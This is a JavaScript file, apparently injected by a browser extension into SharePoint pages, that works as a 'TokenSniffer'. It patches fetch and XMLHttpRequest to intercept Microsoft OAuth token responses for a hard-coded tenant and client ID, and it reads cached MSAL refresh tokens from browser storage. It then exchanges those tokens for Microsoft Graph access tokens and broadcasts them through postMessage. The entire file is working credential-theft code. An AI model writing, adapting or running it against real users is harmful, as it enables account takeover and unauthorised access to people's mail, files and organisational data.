"use strict";
(function () {
    const TARGET_TENANT = "861aedbb-44b4-4bcf-a125-49fa7baf1e26";
    const TARGET_BRK_CLIENT = "08e18876-6177-487e-b8b5-cf950c1e598c";
    function isMatchingUrl(rawUrl) {
        try {
            const url = new URL(rawUrl, window.location.href);
            if (url.origin !== "https://login.microsoftonline.com")
                return false;
            if (!url.pathname.includes("/oauth2/v2.0/token"))
                return false;
            const brkClientId = url.searchParams.get("brk_client_id");
            return brkClientId === TARGET_BRK_CLIENT || url.search.includes(TARGET_BRK_CLIENT);
        }
        catch {
            return false;
        }
    }
    // Exchanges SPFx Refresh Token for Graph Access Token using legitimate SharePoint Origin
    async function exchangeSpfxForGraph(refreshToken) {
        try {
            const res = await fetch(`https://login.microsoftonline.com/${TARGET_TENANT}/oauth2/v2.0/token`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: new URLSearchParams({
                    client_id: TARGET_BRK_CLIENT,
                    grant_type: "refresh_token",
                    scope: "https://graph.microsoft.com/.default",
                    refresh_token: refreshToken,
                }),
            });
            if (res.ok) {
                const data = (await res.json());
                return data.access_token || null;
            }
        }
        catch (err) {
            console.error("[TokenSniffer] In-page Graph exchange error:", err);
        }
        return null;
    }
    async function dispatchToken(json) {
        if (!json.refresh_token)
            return;
        // Exchange immediately within the SharePoint page context
        const graphAccessToken = await exchangeSpfxForGraph(json.refresh_token);
        window.postMessage({
            source: "SPFX_SNIFFER_INJECTED",
            payload: {
                refreshToken: json.refresh_token,
                graphAccessToken,
                expiresIn: json.expires_in,
                extExpiresIn: json.ext_expires_in,
                scope: json.scope,
                capturedAt: Date.now(),
                sourceUrl: window.location.href,
            },
        }, "*");
    }
    // Proactively scan MSAL sessionStorage / localStorage for existing cached refresh tokens
    function scanMsalCache() {
        try {
            const storages = [window.sessionStorage, window.localStorage];
            for (const storage of storages) {
                for (let i = 0; i < storage.length; i++) {
                    const key = storage.key(i);
                    if (!key)
                        continue;
                    if (key.toLowerCase().includes("refreshtoken") && key.includes(TARGET_BRK_CLIENT)) {
                        const raw = storage.getItem(key);
                        if (!raw)
                            continue;
                        const parsed = JSON.parse(raw);
                        if (parsed.secret) {
                            void dispatchToken({
                                refresh_token: parsed.secret,
                                scope: parsed.target,
                                expires_in: 44875,
                            });
                            return;
                        }
                    }
                }
            }
        }
        catch { }
    }
    // Run initial cache scan immediately
    scanMsalCache();
    // Hook window.fetch
    const origFetch = window.fetch;
    window.fetch = async function (...args) {
        const [resource, config] = args;
        let url = "";
        if (typeof resource === "string") {
            url = resource;
        }
        else if (resource instanceof URL) {
            url = resource.href;
        }
        else if (resource && typeof resource === "object" && "url" in resource) {
            url = resource.url;
        }
        const method = config?.method?.toUpperCase() ||
            (typeof resource !== "string" && !(resource instanceof URL) && resource?.method
                ? resource.method.toUpperCase()
                : "GET");
        const response = await origFetch.apply(this, args);
        if (method === "POST" && url && isMatchingUrl(url)) {
            try {
                const clone = response.clone();
                void clone.json().then((json) => {
                    if (json && json.refresh_token) {
                        void dispatchToken(json);
                    }
                });
            }
            catch (e) {
                console.error("[TokenSniffer] Parse error:", e);
            }
        }
        return response;
    };
    // Hook XMLHttpRequest
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function (method, url, ..._rest) {
        this._snifferMethod = method;
        this._snifferUrl = typeof url === "string" ? url : url.toString();
        return origOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function (body) {
        if (this._snifferMethod?.toUpperCase() === "POST" &&
            this._snifferUrl &&
            isMatchingUrl(this._snifferUrl)) {
            this.addEventListener("load", function () {
                try {
                    const json = JSON.parse(this.responseText);
                    if (json && json.refresh_token) {
                        void dispatchToken(json);
                    }
                }
                catch { }
            });
        }
        return origSend.call(this, body);
    };
})();
